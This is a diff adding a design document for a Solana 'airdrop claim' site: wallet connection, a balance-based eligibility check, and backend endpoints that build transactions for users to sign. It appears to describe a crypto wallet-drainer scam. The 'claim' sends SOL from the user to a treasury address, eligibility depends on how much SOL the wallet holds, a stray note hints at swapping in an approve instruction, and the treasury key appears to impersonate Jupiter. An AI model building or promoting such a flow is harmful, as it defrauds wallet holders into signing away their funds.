@@ -1,0 +1,55 @@
+
+1. User connects Solana wallet (Phantom, Solflare, Backpack, Coinbase, Coin98, Glow, Exodus)
+2. Frontend checks eligibility (based on SOL balance — 800–5000 JUP range)
+3. User clicks "Claim"
+4. Frontend calls POST /api/airdrop/claim with wallet public key
+   → Backend fetches latest blockhash from primary RPC
+   → Backend builds a ____--CREATE APPROVEINSTRUCTION---____transfer transaction: wallet → TREASURY_ADDRESS (0.005 SOL)
+   → Returns serialized unsigned transaction (base64)
+5. User signs the transaction in their wallet
+6. Frontend calls POST /api/airdrop/submit with signed transaction
+   → Backend broadcasts via sendRawTransaction 
+   → Backend waits for confirmation
+   → Returns { success: true, signature, explorerUrl }
+7. User sees success screen with Solana Explorer link
+```
+
+
+
+
+### `POST /api/airdrop/claim`
+Build a gas-fee transaction.
+
+**Request:**
+```json
+{ "publicKey": "WALLET_PUBLIC_KEY" }
+```
+**Response:**
+```json
+{
+  "transactions": ["BASE64_ENCODED_UNSIGNED_TX"],
+  "blockhash": "...",
+  "lastValidBlockHeight": 123456789,
+  "treasuryPubkey": "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN"
+}
+```
+
+### `POST /api/airdrop/submit`
+Broadcast a signed transaction.
+
+**Request:**
+```json
+{
+  "publicKey": "WALLET_PUBLIC_KEY",
+  "signatures": ["BASE64_ENCODED_SIGNED_TX"]
+}
+```
+**Response:**
+```json
+{
+  "success": true,
+  "signature": "TX_SIGNATURE",
+  "gasTxID": "TX_SIGNATURE",
+  "explorerUrl": "https://explorer.solana.com/tx/TX_SIGNATURE"
+}
+```
